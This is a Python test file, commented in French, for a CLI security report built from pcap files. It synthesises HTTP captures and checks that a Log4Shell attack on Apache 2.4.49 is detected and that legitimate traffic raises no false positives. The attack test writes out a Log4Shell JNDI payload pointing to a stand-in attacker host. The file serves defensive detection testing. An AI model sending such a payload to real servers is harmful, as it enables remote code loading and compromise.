"""
Rapport de securite (CVE-5, issue #139) sur de VRAIS fichiers pcap decodes
par tshark : le critere d'acceptation « aucun faux positif sur trafic normal
(tests avec PCAP legitime) » ne peut pas etre etabli seulement avec des
`Pkt`/charges utiles fabriquees a la main (test_security_findings.py), puisque
la chaine reelle (tshark -> banniere de service -> base CVE, relecture de la
charge utile brute -> signatures d'exploits) n'y est pas exercee.

Les captures sont synthetisees octet par octet (Ethernet/IPv4/TCP, sans
scapy ni fichier binaire versionne) puis passees a la CLI, exactement comme
`--capture NOM=fichier.pcap --security-report --cve-db base.db`. Sautes si
tshark est absent du PATH.
"""

from __future__ import annotations

import shutil
import socket
import struct
import sys
from pathlib import Path

import pytest
from pcap_builders import write_pcap

import cross_capture_analyzer_cli as cli
from scripts.import_nvd import import_from_file

pytestmark = pytest.mark.skipif(shutil.which("tshark") is None, reason="tshark absent du PATH")

NVD_FIXTURE = Path(__file__).parent / "data" / "nvd_sample.json"

CLIENT, SERVER = "203.0.113.9", "10.0.0.5"
START_US = 1_700_000_000_000_000
SYN, SYN_ACK, ACK, PSH_ACK = 0x02, 0x12, 0x10, 0x18


# -- synthese de captures ------------------------------------------------------


def _frame(src, dst, sport, dport, seq, ack, flags, data=b""):
    tcp = struct.pack("!HHIIBBHHH", sport, dport, seq, ack, 5 << 4, flags, 65535, 0, 0) + data
    ip = struct.pack(
        "!BBHHHBBH4s4s",
        0x45,
        0,
        20 + len(tcp),
        1,
        0x4000,
        64,
        6,
        0,
        socket.inet_aton(src),
        socket.inet_aton(dst),
    )
    return b"\x02\x00\x00\x00\x00\x02" + b"\x02\x00\x00\x00\x00\x01" + b"\x08\x00" + ip + tcp


def _request(uri="/", headers=None, method="GET", body=b""):
    lines = [f"{method} {uri} HTTP/1.1", "Host: example.com"]
    lines += [f"{k}: {v}" for k, v in (headers or {}).items()]
    if body:
        lines.append(f"Content-Length: {len(body)}")
    return "\r\n".join(lines).encode("latin-1") + b"\r\n\r\n" + body


def _response(server_header):
    return f"HTTP/1.1 200 OK\r\nServer: {server_header}\r\nContent-Length: 0\r\n\r\n".encode()


def _write_http_capture(path, exchanges, server_header):
    """Une session TCP client -> serveur:80 avec poignee de main, puis un
    couple requete/reponse par element de `exchanges`."""
    seq_c, seq_s = 1000, 5000
    ts = START_US
    packets = []

    def add(src, dst, sport, dport, seq, ack, flags, data=b""):
        nonlocal ts
        ts += 10_000
        packets.append((ts, _frame(src, dst, sport, dport, seq, ack, flags, data)))

    add(CLIENT, SERVER, 40000, 80, seq_c, 0, SYN)
    add(SERVER, CLIENT, 80, 40000, seq_s, seq_c + 1, SYN_ACK)
    seq_c, seq_s = seq_c + 1, seq_s + 1
    add(CLIENT, SERVER, 40000, 80, seq_c, seq_s, ACK)
    for req in exchanges:
        resp = _response(server_header)
        add(CLIENT, SERVER, 40000, 80, seq_c, seq_s, PSH_ACK, req)
        seq_c += len(req)
        add(SERVER, CLIENT, 80, 40000, seq_s, seq_c, PSH_ACK, resp)
        seq_s += len(resp)
    write_pcap(path, packets)


def _run_security_report(monkeypatch, capsys, capture, cve_db=None):
    argv = ["cross_capture_analyzer_cli.py", "--capture", f"LAN={capture}", "--security-report"]
    if cve_db:
        argv += ["--cve-db", str(cve_db)]
    monkeypatch.setattr(sys, "argv", argv)
    cli.main()
    out = capsys.readouterr().out
    return out[out.index("RAPPORT DE SECURITE") :]


@pytest.fixture
def cve_db(tmp_path):
    db = tmp_path / "cve.db"
    import_from_file(NVD_FIXTURE, db)
    return db


# Trafic web legitime : navigation banale, recherche contenant les mots
# jndi/ldap (sans la syntaxe ${jndi:...}), formulaire dont la valeur contient
# « ${word} » (pas une injection JNDI), page d'accueil.
LEGITIMATE_EXCHANGES = [
    _request("/", {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64)", "Accept": "text/html"}),
    _request("/search?q=jndi+ldap+tutorial", {"User-Agent": "Mozilla/5.0"}),
    _request("/login", method="POST", body=b'{"user":"alice","password":"p@ss${word}"}'),
    _request("/static/app.js", {"Accept-Encoding": "gzip"}),
]


# -- attaque : le rapport doit tout consolider ----------------------------------


def test_pcap_attaque_log4shell_sur_apache_vulnerable(monkeypatch, capsys, tmp_path, cve_db):
    pcap = tmp_path / "attaque.pcap"
    log4shell = _request("/", {"User-Agent": "${jndi:ldap://evil.example/a}"})
    _write_http_capture(pcap, [_request("/"), log4shell], "Apache/2.4.49 (Unix)")

    out = _run_security_report(monkeypatch, capsys, pcap, cve_db)

    assert "score de risque global" in out
    assert "(niveau : critique)" in out
    assert "services detectes : 1 (dont 1 vulnerable(s))" in out
    assert "exploits detectes : 1" in out
    assert "CVE confirmees : 2" in out
    assert "Apache/2.4.49 @ 10.0.0.5:80" in out
    assert "Log4Shell" in out and "CVE-2021-44228" in out
    assert "CVE-2021-41773" in out and "CVE-2021-42013" in out


# -- trafic normal : aucun faux positif -------------------------------------------


@pytest.mark.parametrize("server_header", ["nginx/1.25.3", "Apache/2.4.58 (Unix)"])
def test_pcap_legitime_service_non_affecte_rapport_sans_constat(monkeypatch, capsys, tmp_path, cve_db, server_header):
    """Serveur non affecte (nginx hors base, Apache 2.4.58 corrige) avec la
    base CVE branchee : le service est liste mais jamais signale vulnerable,
    et aucune tentative d'exploitation n'est detectee."""
    pcap = tmp_path / "legitime.pcap"
    _write_http_capture(pcap, LEGITIMATE_EXCHANGES, server_header)

    out = _run_security_report(monkeypatch, capsys, pcap, cve_db)

    assert "score de risque global : 0/100" in out
    assert "services detectes : 1 (dont 0 vulnerable(s))" in out
    assert "exploits detectes : 0" in out
    assert "anomalies (Expert Info) : 0" in out
    assert "CVE confirmees : 0" in out
    assert "aucune tentative d'exploitation detectee" in out
    assert "aucune CVE confirmee" in out
    assert "(niveau : aucun constat)" in out


def test_pcap_legitime_sans_base_cve_ne_pretend_pas_avoir_verifie(monkeypatch, capsys, tmp_path):
    """Sans --cve-db, le rapport reste vide de constats mais la CLI doit
    signaler l'absence de correlation (« aucune vulnerabilite connue » ne
    veut alors pas dire « non vulnerable »)."""
    pcap = tmp_path / "legitime.pcap"
    _write_http_capture(pcap, LEGITIMATE_EXCHANGES, "Apache/2.4.49 (Unix)")

    monkeypatch.setattr(sys, "argv", ["cross_capture_analyzer_cli.py", "--capture", f"LAN={pcap}", "--security-report"])
    cli.main()
    out = capsys.readouterr().out

    assert "Aucune base CVE fournie (--cve-db)" in out
    assert "score de risque global : 0/100" in out
    assert "CVE confirmees : 0" in out
